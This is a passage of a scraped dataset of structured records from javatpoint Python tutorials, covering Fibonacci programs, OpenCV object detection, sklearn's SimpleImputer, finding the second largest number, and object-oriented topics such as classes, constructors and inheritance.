Series:"", Fibonacci_Series(12))', '# defining the function to find the nth Fibonacci Number', 'def Fibonacci_series(x):', '# Taking First two terms of the Fibonacci Series as 0 and 1', 'fib_Array = [0, 1]', '# Here, as we know that the first two terms of Fibonacci Series are 0 and 1,', '# we append the remaining values (Fibonacci numbers from index 2 to x)', '# in the array using recursion and return the last element.', '# In the range function, we take range(2, x + 1) instead of range(2, x).', '# This is because range function in python iterates until the value', '# before the upper limit. So, if we take from 2 to x, it would only', '# iterate from second to (x - 1)th element.', 'for n in range(2, x + 1):', 'fib_Array.append(fib_Array[n - 1] + fib_Array[n - 2])', 'return fib_Array[x]', 'print(""12th Term of Fibonacci Series:"", Fibonacci_series(12))', '# defing the function to return the nth element of the Fibonacci Series', 'def Fibonacci_series(x):', '# assiging the variables', 'm = 0', 'n = 1', '# using the if-elif-else conditional statements', 'if x < 0:', 'print(""Wrong input"")', 'elif x == 0:', 'return m', 'elif x == 1:', 'return n', 'else:', '# using the for-loop', 'for i in range(2, x + 1):', 'o = m + n', 'm = n', 'n = o', 'return n', '# printing the twelveth term of the Fibonacci Series', 'print(""12th element of the Fibonacci Series:"", Fibonacci_series(12))', '# defining the function', 'def Fibonacci_series(x):', '# creating an array in the function', 'fib_Array = [0] * (x + 1)', 'fib_Array[1] = 1', '# adding elements of the series to the array using addition of previous two elements.', 'for n in range (2, x + 1):', 'fib_Array[n] = fib_Array[n - 1] + fib_Array[n - 2]', 'return fib_Array[x]', 'if __name__ == ""__main__"":', 'print(""12th element of the Fibonacci series:"", Fibonacci_series(12))']","['12th Element of the Fibonacci Series: 144', '12th Term of Fibonacci Series: 144', '12th element of the Fibonacci Series: 144', '12th element of the Fibonacci series: 144']",[],['|||Finding nth Fibonacci Number using Recursion|||Finding nth Fibonacci Number using dynamic programming|||Finding nth Fibonacci Number using dynamic programming and space optimization|||Finding nth Fibonacci Number using arrays|||']
65,['Python OpenCV object detection'],"['OpenCV is the huge and open-source library for image processing, machine learning and computer vision. It is also playing an important role in real-time operation. With the help of the OpenCV library, we can easily process the images as well as videos to identify the objects, faces or even handwriting of a human present in the file. We will only focus to object detection from images using OpenCV in this tutorial. We will learn about how we can use OpenCV to do object detection from a given image using a Python program.']","['https://www.javatpoint.com/python-simpleimputer-module', 'https://www.javatpoint.com/python-program-to-find-the-nth-fibonacci-number', 'https://www.javatpoint.com/python-simpleimputer-module', 'https://www.javatpoint.com/python-program-to-find-the-nth-fibonacci-number', 'https://www.javatpoint.com/python-simpleimputer-module']","['https://static.javatpoint.com/python/images/python-opencv-object-detection.png', 'https://static.javatpoint.com/python/images/python-opencv-object-detection2.png', 'https://static.javatpoint.com/python/images/python-opencv-object-detection3.png', 'https://static.javatpoint.com/python/images/python-opencv-object-detection4.png', 'https://static.javatpoint.com/python/images/python-opencv-object-detection5.png', 'https://static.javatpoint.com/python/images/python-opencv-object-detection6.png', 'https://static.javatpoint.com/python/images/python-opencv-object-detection7.png']",[],"['Object Detection', 'Object Detection using OpenCV']","['Haar cascade:', 'Requirements for object detection with Python OpenCV:', '1. Installation of OpenCV library:', '2. Installation of matplotlib library:', 'Implementation of Object detection in Python:', 'Opening the Image', 'Recognition or object detection in the image']",[],"[""In this tutorial, we will use the Haar cascade technique to do object detection. Let's learn in brief about the Haar cascade technique first."", 'As we can see that, the OpenCV library is successfully installed in our system, and now we can import it into a Python program to use its functions.', 'We have installed all the required libraries for performing object detection, and now we can move ahead with the implementation part of this task.', 'Example 1: Opening the image using OpenCV and matplotlib library in a Python program:', 'Explanation:', 'As we can see in the output, the image is displayed as a result of the program, and its borders have been sub-plotted.', 'Example 2: Object detection in the image using the detectMultiScale() in the following Python program:', 'Explanation:', 'As we can see in the output, the image with the object detected part as highlighted is shown to us when we run the program.']","['We have to install first some important libraries in our system as it is an important requirement for doing object detection tasks. We have to install the following libraries into our system as the requirement for performing object detection:', 'When we press the enter key after writing this command in the terminal, the pip installer in the command prompt will start installing the OpenCV library into our system.', 'When we press the enter key after writing this command in the terminal, the pip installer in the command prompt will start installing it into our system.', 'As we can see that, the matplotlib library is successfully installed in our system, and now we can import it into a Python program to use its functions for opening, reading etc., images.', 'In this part, we will write the Python programs to do the object detection and understand the implementation of it. We will use the following image in our Python program to perform the object detection on it:', ""We will first open the image given above and create the environment of the picture to show it in the output. Let's first look at an example program to understand the implementation, and then we will look at the explanation part."", 'First, we have imported the OpenCV (as cv2) and matplotlib (as plt) libraries into the program to use their functions in the code. After that, we have opened the image file using the imread() function of cv2.', 'Now, we will use the detectMultiScale() in the program to detect the object present in the image. Following is the syntax for using detectMultiScale() function in the code:', 'After opening the image in the program, we have imported the cascade classifier XML file into the program. Then, we used the detectMultiScale() function with the imported cascade file to detect the object present in the image or not.']","['Basically, object detection is a modern computer technology that is related to image processing, deep learning and computer vision to detect the objects present in an image file. All the technologies used in the Object detection technique (as we mentioned earlier) deals with detecting instances of the object in the image or video.', ""We have learned about object detection in the previous section, and in this section, we will learn that how we can do object detection in an image or video using the OpenCV library. We will first import the OpenCV library in the Python program, and then we will use functions to perform object detection on an image file given to us. But, before using and importing the library functions, let's first install the requirements for using the Object detection technique."", ""Basically, the Haar cascade technique is an approach based on machine learning where we use a lot of positive and negative images to train the classifier to classify between the images. Haar cascade classifiers are considered as the effective way to do object detection with the OpenCV library. Now, let's understand the concept of positive and negative images that we have discussed earlier:"", 'First and foremost, the requirement to perform object detection using the OpenCV library is that the OpenCV library should be present in our device so that we can import it into a Python program and use its object detection functions. If this library is not present in our system, we can use the following command in our command prompt terminal to install it:', ""Matplotlib is very helpful in the opening, closing, reading etc., images in a Python program, and that's why the installation of this library for object detection becomes an important requirement. If the matplotlib library is not present in our system, we have to use the following command in our command prompt terminal to install it:"", 'Then, we have defined the properties for the image we opened in the program using the cv2 functions. Then, we subplot the image using the subplot() function of plt and giving parameters in it. In last, we have used the imshow() and show() function of the plt module to show the image in the output.', ""We will use a condition statement with this function in the program to check if any object from the image is detected or not and highlight the detected part. Let's understand the implementation of object detection in the image through an example program."", 'We used if condition in the program to check that object is detected or not, and if the object is detected, we have highlighted the detected object part using for loop with cv2 functions. After highlighting the detected object part in the image, we have displayed the processed image using the plt show() and imshow() function.']","['pip install opencv-python', 'pip install matplotlib', '# Import OpenCV module', 'import cv2', '# Import pyplot from matplotlib as pltd', 'from matplotlib import pyplot as pltd', '# Opening the image from files', 'imaging = cv2.imread(""opencv-od.png"")', '# Altering properties of image with cv2', 'img_gray = cv2.cvtColor(imaging, cv2.COLOR_BGR2GRAY)', 'imaging_rgb = cv2.cvtColor(imaging, cv2.COLOR_BGR2RGB)', '# Plotting image with subplot() from plt', 'pltd.subplot(1, 1, 1)', '# Displaying image in the output', 'pltd.imshow(imaging_rgb)', 'pltd.show()', 'found = xml_data.detectMultiScale(img_gray,', 'minSize = (30, 30))', '# Import OpenCV module', 'import cv2', '# Import pyplot from matplotlib as plt', 'from matplotlib import pyplot as pltd', '# Opening the image from files', 'imaging = cv2.imread(""opencv-od.png"")', '# Altering properties of image with cv2', 'imaging_gray = cv2.cvtColor(imaging, cv2.COLOR_BGR2GRAY)', 'imaging_rgb = cv2.cvtColor(imaging, cv2.COLOR_BGR2RGB)', '# Importing Haar cascade classifier xml data', ""xml_data = cv2.CascadeClassifier('XML-data.xml')"", '# Detecting object in the image with Haar cascade classifier', 'detecting = xml_data.detectMultiScale(imaging_gray,', 'minSize = (30, 30))', '# Amount of object detected', 'amountDetecting = len(detecting)', '# Using if condition to highlight the object detected', 'if amountDetecting != 0:', 'for (a, b, width, height) in detecting:', 'cv2.rectangle(imaging_rgb, (a, b), # Highlighting detected object with rectangle', '(a + height, b + width),', '(0, 275, 0), 9)', '# Plotting image with subplot() from plt', 'pltd.subplot(1, 1, 1)', '# Displaying image in the output', 'pltd.imshow(imaging_rgb)', 'pltd.show()']",[],[],"['|||Positive images: These are the images that contain the objects which we want to be identified from the classifier.|||Negative Images: These are the images that do not contain any object that we want to be detected by the classifier, and these can be images of everything else.|||']"
66,['Python SimpleImputer module'],"['In this tutorial, we are going to learn about the SimpleImputer module of the Sklearn library, and it was previously known as impute module but updated in the latest versions of the Sklearn library. We will discuss the SimpleImputer class and how we can use it to handle missing data in a dataset and replace the missing values inside the dataset using a Python program.']","['https://www.javatpoint.com/second-largest-number-in-python', 'https://www.javatpoint.com/python-opencv-object-detection', 'https://www.javatpoint.com/second-largest-number-in-python', 'https://www.javatpoint.com/python-opencv-object-detection', 'https://www.javatpoint.com/second-largest-number-in-python']",['https://static.javatpoint.com/python/images/python-simpleimputer-module.png'],[],"['SimpleImputer class', 'Conclusion']","['Syntax for SimpleImputer() method:', 'Installation of Sklearn library:', 'Handling NaN values in the dataset with SimpleImputer class']",[],"['To implement the SimpleImputer() class method into a Python program, we have to use the following syntax:', 'Parameters: Following are the parameters which has to be defined while using the SimpleImputer() method:', 'We can install the Sklearn by using the following command inside the command terminal prompt of our system:', 'After pressing the enter key, the sklearn module will start installing in our device, as we can see below:', 'Now, the Sklearn module is installed in our system, and we can move ahead with the SimpleImputer class function.', 'Example 1: Look at the following Python program with a dataset having NaN values defined in it:', 'Explanation:']","['SimpleImputer class is the module class of Sklearn library, and to use this class, first we have to install the Sklearn library in our system if it is not present already.', ""As we can see in the output, the imputed value dataset having mean values in the place of missing values, and that's how we can use the SimpleImputer module class to handle NaN values from a dataset.""]","['A scikit-learn class that we can use to handle the missing values in the data from the dataset of a predictive model is called SimpleImputer class. With the help of this class, we can replace NaN (missing values) values in the dataset with a specified placeholder. We can implement and use this module class by using the SimpleImputer() method in the program.', ""Now, we will use the SimpleImputer class in a Python program to handle the missing values present in the dataset (that we will use in the program). We will define a dataset in the example program while giving some missing values in it, and then we use the SimpleImputer class method to handle those values from the dataset by defining its parameters. Let's understand the implementation of this through an example Python program."", ""We have firstly imported the numpy module (to define a dataset) and sklearn module (to use the SimpleImputer class method) into the program. Then, we defined the imputer to handle the missing values using the SimpleImputer class method, and we used the 'mean' strategy to replace the missing values from the dataset. After that, we have defined a dataset in the program using the numpy module function and gave some missing values (NaN values) in the dataset. Then, we printed the original dataset in the output. After that, we have imputed and replaced the missing values from the dataset with the imputer that we have defined earlier in the program with SimpleImputer class. After imputing the dataset and replacing the missing values from it, we have printed the new dataset as a result."", 'We have read about the SimpleImputer class method in this method, and we learned how we could use it to handle the NaN values present in a dataset. We learned about the strategy value parameter, which we use to define the method for replacing the NaN values of the dataset. We have also learned about the installation of the Sklearn library, and then last, we used the SimpleImputer class method in an example to impute the dataset.']","['SimpleImputer(missingValues, strategy)', 'pip install sklearn', '# Import numpy module as nmp', 'import numpy as nmp', '# Importing SimpleImputer class from sklearn impute module', 'from sklearn.impute import SimpleImputer', '# Setting up imputer function variable', ""imputerFunc = SimpleImputer(missing_values = nmp.nan, strategy ='mean')"", '# Defining a dataset', 'dataSet = [[32, nmp.nan, 34, 47], [17, nmp.nan, 71, 53], [19, 29, nmp.nan, 79], [nmp.nan, 31, 23, 37], [19, nmp.nan, 79, 53]]', '# Print original dataset', 'print(""The Original Dataset we defined in the program: \\n"", dataSet)', '# Imputing dataset by replacing missing values', 'imputerFunc = imputerFunc.fit(dataSet)', 'dataSet2 = imputerFunc.transform(dataSet)', '# Printing imputed dataset', 'print(""The imputed dataset after replacing missing values from it: \\n"", dataSet2)']","['The Original Dataset we defined in the program:', '[[32, nan, 34, 47], [17, nan, 71, 53], [19, 29, nan, 79], [nan, 31, 23, 37], [19, nan, 79, 53]]', 'The imputed dataset after replacing missing values from it:', '[[32.   30.   34.   47.  ]', '[17.   30.   71.   53.  ]', '[19.   29.   51.75 79.  ]', '[21.75 31.   23.   37.  ]', '[19.   30.   79.   53.  ]]']",[],"[""||| missingValues: It is the missing values placeholder in the SimpleImputer() method which has to be imputed during the execution, and by default, the value for missing values placeholder is NaN.||| strategy: It is the data that is going to replace the missing values (NaN values) from the dataset, and by default, the value method for this parameter is 'Mean'. The strategy parameter of the SimpleImputer() method can take 'Mean', 'Mode', Median' (Central tendency measuring methods) and 'Constant' value input in it.||| fillValue: This parameter is used only in the strategy parameter if we give 'Constant' as replacing value method. We have to define the constant value for the strategy parameter, which is going to replace the NaN values from the dataset.|||""]"
67,['Second Largest Number in Python'],"['When we have a lot of elements in our list, the thought of finding the highest or lowest element can come to our mind and Python has made it much easier for us.']","['https://www.javatpoint.com/defaultdict-in-python', 'https://www.javatpoint.com/python-simpleimputer-module', 'https://www.javatpoint.com/defaultdict-in-python', 'https://www.javatpoint.com/python-simpleimputer-module', 'https://www.javatpoint.com/defaultdict-in-python']",[],[],"['Sorting the list and then print the second last number', 'Removing the maximum element', 'Traversing the list']",[],[],"['In this article, we shall how we can use to find the second largest number in Python from a list.', 'Let us have a look at the first approach-', 'The following program illustrates how we can do it in Python-', ""It's time to go for the explanation part-"", 'The second method is to obtain the second largest element of the list by removing the maximum element.', 'Let us see how we can do it.', 'Explanation -', 'Let us understand what we have done in the above program-', 'In the third method, we will use for loop and find the second largest number from the list.', 'Explanation -', 'Let us have a glance at what we have done here-', 'The following program illustrates the same-', 'Explanation -', 'Let us understand what we have done in the above program-']","['In the last program, we will traverse the list to find out the largest number and then make use of conditional statements to find the second largest number from the list.', 'So, in this article, we got the chance to think out of the box and discover some new ways to develop the logic for finding the second largest number in Python.']",[],"['#program to find the second largest number of list', '# declaring the list', 'list_val = [20, 30, 40, 25, 10]', '# sorting the list', 'list_val.sort()', '#displaying the second last element of the list', 'print(""The second largest element of the list is:"", list_val[-2])', '#program to find the second largest number of list', '# declaring the list', 'list_val = [20, 30, 40, 25, 10]', '# new_list is a set of list1', 'res_list = set(list_val)', '#removing the maximum element', 'res_list.remove(max(res_list))', '#printing the second largest element', 'print(max(res_list))', '# declaring empty list', 'list_val = []', '# user provides the number of elements to be added in the list', 'num_list = int(input(""Enter number of elements in list: ""))', 'for i in range(1, num_list + 1):', 'element = int(input(""Enter the elements: ""))', 'list_val.append(element)', '# sort the list', 'list_val.sort()', '# print second largest element', 'print(""Second largest element is:"", list_val[-2])', 'def calc_largest(arr):', 'second_largest = arr[0]', 'largest_val = arr[0]', 'for i in range(len(arr)):', 'if arr[i] > largest_val:', 'largest_val = arr[i]', 'for i in range(len(arr)):', 'if arr[i] > second_largest and arr[i] != largest_val:', 'second_largest = arr[i]', 'return second_largest', 'print(calc_largest([20, 30, 40, 25, 10]))']","['The second largest element of the list is: 30', '30', 'Enter number of elements in list: 5', 'Enter the elements: 10', 'Enter the elements: 20', 'Enter the elements: 30', 'Enter the elements: 40', 'Enter the elements: 50', 'The second largest element is: 40', '30']",[],"['|||Sorting the list and then print the second last number.|||Removing the maximum element.|||Finding the maximum element.|||Traversing the list.||||||We have declared the list from which we want to take out the second last element.|||After this, we used the sort method so that all the elements of our list are arranged in ascending order.|||Now we make use of negative indexing since the second-largest number will come at the second last position.||||||We have declared the list from which we want to take out the second last element.|||After this, we used the set method to take all the unique elements of the list.|||Now we make use of max() to get the maximum value from the list and then remove it.|||After this, we print the maximum of the resultant list which will give us the second-largest number.||||||We have declared an empty list in which we will insert the elements.|||After this, we ask the user to provide us the number of elements we would like to add to our list.|||After this, we use the sort method so that all the elements of our list are arranged in ascending order.|||Now we make use of negative indexing since the second-largest number will come at the second last position.||||||The first step is to create a function that checks the largest number from the list by traversing it.|||In the next for loop, we traverse the list again for finding the highest number but this time excludes the previous one since here our objective is to find the second largest function.|||Finally, we pass our list in the function.|||']"
68,['Python OOPs Concepts'],"['Like other general-purpose programming languages, Python is also an object-oriented language since its beginning. It allows us to develop applications using an Object-Oriented approach. In Python, we can easily create and use classes and objects.']","['https://www.javatpoint.com/python-objects-classes', 'https://www.javatpoint.com/python-multiprocessing', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-objects-classes', 'https://www.javatpoint.com/python-multiprocessing', 'https://www.javatpoint.com/python-objects-classes']",[],[],"['Class', 'Object', 'Method', 'Inheritance', 'Polymorphism', 'Encapsulation', 'Data Abstraction', 'Object-oriented vs. Procedure-oriented Programming languages']",[],[],"['Major principles of object-oriented programming system are given below.', 'The object is an entity that has state and behavior. It may be any real-world object like the mouse, keyboard, chair, table, pen, etc.', 'When we define a class, it needs to create an object to allocate the memory. Consider the following example.', 'The method is a function that is associated with an object. In Python, a method is not unique to class instances. Any object type can have methods.', 'It provides the re-usability of the code.', 'The difference between object-oriented and procedure-oriented programming is given below:']","['Everything in Python is an object, and almost everything has attributes and methods. All functions have a built-in attribute __doc__, which returns the docstring defined in the function source code.', 'Inheritance is the most important aspect of object-oriented programming, which simulates the real-world concept of inheritance. It specifies that the child object acquires all the properties and behaviors of the parent object.', 'By using inheritance, we can create a class which uses all the properties and behavior of another class. The new class is known as a derived class or child class, and the one whose properties are acquired is known as a base class or parent class.', 'Encapsulation is also an essential aspect of object-oriented programming. It is used to restrict access to methods and variables. In encapsulation, code and data are wrapped together within a single unit from being modified by accident.', 'Data abstraction and encapsulation both are often used as synonyms. Both are nearly synonyms because data abstraction is achieved through encapsulation.', 'Abstraction is used to hide internal details and show only functionalities. Abstracting something means to give names to things so that the name captures the core of what a function or a whole program does.']","['An object-oriented paradigm is to design the program using classes and objects. The object is related to real-word entities such as book, house, pencil, etc. The oops concept focuses on writing the reusable code. It is a widespread technique to solve the problem by creating objects.', 'The class can be defined as a collection of objects. It is a logical entity that has some specific attributes and methods. For example: if you have an employee class, then it should contain an attribute and method, i.e. an email id, name, age, salary, etc.', 'In the above example, we have created the class named car, and it has two attributes modelname and year. We have created a c1 object to access the class attribute. The c1 object will allocate memory for these values. We will learn more about class and object in the next tutorial.', 'Polymorphism contains two words ""poly"" and ""morphs"". Poly means many, and morph means shape. By polymorphism, we understand that one task can be performed in different ways. For example - you have a class animal, and all animals speak. But they speak differently. Here, the ""speak"" behavior is polymorphic in a sense and depends on the animal. So, the abstract ""animal"" concept does not actually ""speak"", but specific animals (like dogs and cats) have a concrete implementation of the action ""speak"".']","['class ClassName:', '<statement-1>', '.', '.', '<statement-N>', 'class car:', 'def __init__(self,modelname, year):', 'self.modelname = modelname', 'self.year = year', 'def display(self):', 'print(self.modelname,self.year)', 'c1 = car(""Toyota"", 2016)', 'c1.display()']",['Toyota 2016'],"[""Index|||Object-oriented Programming|||Procedural Programming&&&1.|||Object-oriented programming is the problem-solving approach and used where computation is done by using objects.|||Procedural programming uses a list of instructions to do computation step by step.&&&2.|||It makes the development and maintenance easier.|||In procedural programming, It is not easy to maintain the codes when the project becomes lengthy.&&&3.|||It simulates the real world entity. So real-world problems can be easily solved through oops.|||It doesn't simulate the real world. It works on step by step instructions divided into small parts called functions.&&&4.|||It provides data hiding. So it is more secure than procedural languages. You cannot access private data from anywhere.|||Procedural language doesn't provide any proper way for data binding, so it is less secure.&&&5.|||Example of object-oriented programming languages is C++, Java, .Net, Python, C#, etc.|||Example of procedural languages are: C, Fortran, Pascal, VB etc.""]",['|||Class|||Object|||Method|||Inheritance|||Polymorphism|||Data Abstraction|||Encapsulation|||']
69,['Python Class and Objects'],"[""We have already discussed in previous tutorial, a class is a virtual entity and can be seen as a blueprint of an object. The class came into existence when it instantiated. Let's understand it by an example.""]","['https://www.javatpoint.com/python-constructors', 'https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/python-constructors', 'https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/python-constructors']",[],[],"['Creating classes in Python', 'Creating an instance of the class', 'Delete the Object']",['The self-parameter'],[],"['On the other hand, the object is the instance of a class. The process of creating an object can be called instantiation.', 'In Python, a class can be created by using the keyword class, followed by the class name. The syntax to create a class is given below.', 'Consider the following example to create a class Employee which contains two fields as Employee id, and name.', 'The class also contains a function display(), which is used to display the information of the Employee.', 'The syntax to create the instance of the class is given below.', 'The following example creates the instance of the class Employee defined in the above example.', 'We have created a new instance object named emp. By using it, we can access the attributes of the class.', 'We can delete the properties of the object or object itself by using the del keyword. Consider the following example.', 'It will through the Attribute error because we have deleted the object emp.']","['In this section of the tutorial, we will discuss creating classes and objects in Python. We will also discuss how a class attribute is accessed by using the object.', 'Here, the self is used as a reference variable, which refers to the current class object. It is always the first argument in the function definition. However, using self is optional in the function call.', 'The self-parameter refers to the current instance of the class and accesses the class variables. We can use anything instead of self, but it must be the first parameter of any function which belongs to the class.', 'A class needs to be instantiated if we want to use the class attributes in another class or method. A class can be instantiated by calling the class using the class name.', 'In the above code, we have created the Employee class which has two attributes named id and name and assigned value to them. We can observe we have passed the self as parameter in display function. It is used to refer to the same class attribute.']","['Suppose a class is a prototype of a building. A building contains all the details about the floor, rooms, doors, windows, etc. we can make as many buildings as we want, based on these details. Hence, the building can be seen as a class, and we can create as many objects of this class.']","['class ClassName:', '#statement_suite', 'class Employee:', 'id = 10', 'name = ""Devansh""', 'def display (self):', 'print(self.id,self.name)', '<object-name> = <class-name>(<arguments>)', 'class Employee:', 'id = 10', 'name = ""John""', 'def display (self):', 'print(""ID: %d \\nName: %s""%(self.id,self.name))', '# Creating a emp instance of Employee class', 'emp = Employee()', 'emp.display()', 'class Employee:', 'id = 10', 'name = ""John""', 'def display(self):', 'print(""ID: %d \\nName: %s"" % (self.id, self.name))', '# Creating a emp instance of Employee class', 'emp = Employee()', '# Deleting the property of object', 'del emp.id', '# Deleting the object itself', 'del emp', 'emp.display()']","['ID: 10', 'Name: John']",[],[]
70,['Python Constructor'],['A constructor is a special type of method (function) which is used to initialize the instance members of the class.'],"['https://www.javatpoint.com/inheritance-in-python', 'https://www.javatpoint.com/python-objects-classes', 'https://www.javatpoint.com/inheritance-in-python', 'https://www.javatpoint.com/python-objects-classes', 'https://www.javatpoint.com/inheritance-in-python']",[],[],"['Creating the constructor in python', 'Python Non-Parameterized Constructor', 'Python Parameterized Constructor', 'Python Default Constructor', 'More than One Constructor in Single class', 'Python built-in class functions', 'Built-in class attributes']","['Example', 'Counting the number of objects of a class', 'Example', 'Example', 'Example', 'Example', 'Example', 'Example', 'Example']",['Note: The constructor overloading is not allowed in Python.'],"['In C++ or Java, the constructor has the same name as its class, but it treats constructor differently in Python. It is used to create an object.', 'Constructors can be of two types.', 'Consider the following example to initialize the Employee class attributes.', 'The constructor is called automatically when we create the object of the class. Consider the following example.', 'The parameterized constructor has multiple parameters along with the self. Consider the following example.', ""Let's have a look at another scenario, what happen if we declare the two same constructors in the class."", 'The built-in functions defined in the class are described in the following table.', 'Along with the other attributes, a Python class also contains some built-in class attributes which provide information about the class.', 'The built-in class attributes are given in the below table.']","['Constructor definition is executed when we create the object of this class. Constructors also verify that there are enough resources for the object to perform any start-up task.', 'In Python, the method the __init__() simulates the constructor of the class. This method is called when the class is instantiated. It accepts the self-keyword as a first argument which allows accessing the attributes or method of the class.', 'The non-parameterized constructor uses when we do not want to manipulate the value or the constructor that has only self as an argument. Consider the following example.', 'When we do not include the constructor in the class or forget to declare it, then that becomes the default constructor. It does not perform any task but initializes the objects. Consider the following example.']","['We can pass any number of arguments at the time of creating the class object, depending upon the __init__() definition. It is mostly used to initialize the class attributes. Every class must have a constructor, even if it simply relies on the default constructor.', 'In the above code, the object st called the second constructor whereas both have the same configuration. The first method is not accessible by the st object. Internally, the object of the class will always call the last constructor if the class has multiple constructors.']","['class Employee:', 'def __init__(self, name, id):', 'self.id = id', 'self.name = name', 'def display(self):', 'print(""ID: %d \\nName: %s"" % (self.id, self.name))', 'emp1 = Employee(""John"", 101)', 'emp2 = Employee(""David"", 102)', '# accessing display() method to print employee 1 information', 'emp1.display()', '# accessing display() method to print employee 2 information', 'emp2.display()', 'class Student:', 'count = 0', 'def __init__(self):', 'Student.count = Student.count + 1', 's1=Student()', 's2=Student()', 's3=Student()', 'print(""The number of students:"",Student.count)', 'class Student:', '# Constructor - non parameterized', 'def __init__(self):', 'print(""This is non parametrized constructor"")', 'def show(self,name):', 'print(""Hello"",name)', 'student = Student()', 'student.show(""John"")', 'class Student:', '# Constructor - parameterized', 'def __init__(self, name):', 'print(""This is parametrized constructor"")', 'self.name = name', 'def show(self):', 'print(""Hello"",self.name)', 'student = Student(""John"")', 'student.show()', 'class Student:', 'roll_num = 101', 'name = ""Joseph""', 'def display(self):', 'print(self.roll_num,self.name)', 'st = Student()', 'st.display()', 'class Student:', 'def __init__(self):', 'print(""The First Constructor"")', 'def __init__(self):', 'print(""The second contructor"")', 'st = Student()', 'class Student:', 'def __init__(self, name, id, age):', 'self.name = name', 'self.id = id', 'self.age = age', '# creates the object of the class Student', 's = Student(""John"", 101, 22)', '# prints the attribute name of the object s', ""print(getattr(s, 'name'))"", '# reset the value of attribute age to 23', 'setattr(s, ""age"", 23)', '# prints the modified value of age', ""print(getattr(s, 'age'))"", '# prints true if the student contains the attribute with name id', ""print(hasattr(s, 'id'))"", '# deletes the attribute age', ""delattr(s, 'age')"", '# this will give an error since the attribute age has been deleted', 'print(s.age)', 'class Student:', 'def __init__(self,name,id,age):', 'self.name = name;', 'self.id = id;', 'self.age = age', 'def display_details(self):', 'print(""Name:%s, ID:%d, age:%d""%(self.name,self.id))', 's = Student(""John"",101,22)', 'print(s.__doc__)', 'print(s.__dict__)', 'print(s.__module__)']","['ID: 101', 'Name: John', 'ID: 102', 'Name: David', 'The number of students: 3', 'This is parametrized constructor', 'Hello John', '101 Joseph', 'The Second Constructor', 'John', '23', 'True', ""AttributeError: 'Student' object has no attribute 'age'"", 'None', ""{'name': 'John', 'id': 101, 'age': 22}"", '__main__']","['SN|||Function|||Description&&&1|||getattr(obj,name,default)|||It is used to access the attribute of the object.&&&2|||setattr(obj, name,value)|||It is used to set a particular value to the specific attribute of an object.&&&3|||delattr(obj, name)|||It is used to delete a specific attribute.&&&4|||hasattr(obj, name)|||It returns true if the object contains some specific attribute.', 'SN|||Attribute|||Description&&&1|||__dict__|||It provides the dictionary containing the information about the class namespace.&&&2|||__doc__|||It contains a string which has the class documentation&&&3|||__name__|||It is used to access the class name.&&&4|||__module__|||It is used to access the module in which, this class is defined.&&&5|||__bases__|||It contains a tuple including all base classes.']",['|||Parameterized Constructor|||Non-parameterized Constructor|||']
71,['Python Inheritance'],['Inheritance is an important aspect of the object-oriented paradigm. Inheritance provides code reusability to the program because we can use an existing class to create a new class instead of creating it from scratch.'],"['https://www.javatpoint.com/abstraction-in-python', 'https://www.javatpoint.com/python-constructors', 'https://www.javatpoint.com/abstraction-in-python', 'https://www.javatpoint.com/python-constructors', 'https://www.javatpoint.com/abstraction-in-python']","['https://static.javatpoint.com/python/images/python-inheritance.png', 'https://static.javatpoint.com/python/images/python-inheritance2.png', 'https://static.javatpoint.com/python/images/python-inheritance3.png']",[],"['Python Multi-Level inheritance', 'Python Multiple inheritance', 'The issubclass(sub,sup) method', 'The isinstance (obj, class) method', 'Method Overriding', 'Data abstraction in python']","['Syntax', 'Syntax', 'Example 1', 'Syntax', 'Example', 'Syntax', 'Example', 'Example', 'Example', 'Example', 'Real Life Example of method overriding', 'Example']",[],"['A class can inherit multiple classes by mentioning all of them inside the bracket. Consider the following syntax.', 'The syntax of multi-level inheritance is given below.', 'Python provides us the flexibility to inherit multiple base classes in the child class.', 'The syntax to perform multiple inheritance is given below.', 'Consider the following example.', 'Consider the following example.', 'Consider the following example to perform method overriding in python.', 'Consider the following example.']","['In python, a derived class can inherit base class by just mentioning the base in the bracket after the derived class name. Consider the following syntax to inherit a base class into the derived class.', 'The issubclass(sub, sup) method is used to check the relationships between the specified classes. It returns true if the first class is the subclass of the second class, and false otherwise.', 'The isinstance() method is used to check the relationship between the objects and classes. It returns true if the first parameter, i.e., obj is the instance of the second parameter, i.e., class. ']","['In inheritance, the child class acquires the properties and can access all the data members and functions defined in the parent class. A child class can also provide its specific implementation to the functions of the parent class. In this section of the tutorial, we will discuss inheritance in detail.', 'Multi-Level inheritance is possible in python like other object-oriented languages. Multi-level inheritance is archived when a derived class inherits another derived class. There is no limit on the number of levels up to which, the multi-level inheritance is archived in python.', 'We can provide some specific implementation of the parent class method in our child class. When the parent class method is defined in the child class with some specific implementation, then the concept is called method overriding. We may need to perform method overriding in the scenario where the different definition of a parent class method is needed in the child class. ', 'Abstraction is an important aspect of object-oriented programming. In python, we can also perform data hiding by adding the double underscore (___) as a prefix to the attribute which is to be hidden. After this, the attribute will not be visible outside of the class through the object.']","['class derived-class(base class):', '<class-suite>', 'class derive-class(<base class 1>, <base class 2>, ..... <base class n>):', '<class - suite>', 'class Animal:', 'def speak(self):', 'print(""Animal Speaking"")', '#child class Dog inherits the base class Animal', 'class Dog(Animal):', 'def bark(self):', 'print(""dog barking"")', 'd = Dog()', 'd.bark()', 'd.speak()', 'class class1:', '<class-suite>', 'class class2(class1):', '<class suite>', 'class class3(class2):', '<class suite>', 'class Animal:', 'def speak(self):', 'print(""Animal Speaking"")', '#The child class Dog inherits the base class Animal', 'class Dog(Animal):', 'def bark(self):', 'print(""dog barking"")', '#The child class Dogchild inherits another child class Dog', 'class DogChild(Dog):', 'def eat(self):', 'print(""Eating bread..."")', 'd = DogChild()', 'd.bark()', 'd.speak()', 'd.eat()', 'class Base1:', '<class-suite>', 'class Base2:', '<class-suite>', 'class BaseN:', '<class-suite>', 'class Derived(Base1, Base2, ...... BaseN):', '<class-suite>', 'class Calculation1:', 'def Summation(self,a,b):', 'return a+b;', 'class Calculation2:', 'def Multiplication(self,a,b):', 'return a*b;', 'class Derived(Calculation1,Calculation2):', 'def Divide(self,a,b):', 'return a/b;', 'd = Derived()', 'print(d.Summation(10,20))', 'print(d.Multiplication(10,20))', 'print(d.Divide(10,20))', 'class Calculation1:', 'def Summation(self,a,b):', 'return a+b;', 'class Calculation2:', 'def Multiplication(self,a,b):', 'return a*b;', 'class Derived(Calculation1,Calculation2):', 'def Divide(self,a,b):', 'return a/b;', 'd = Derived()', 'print(issubclass(Derived,Calculation2))', 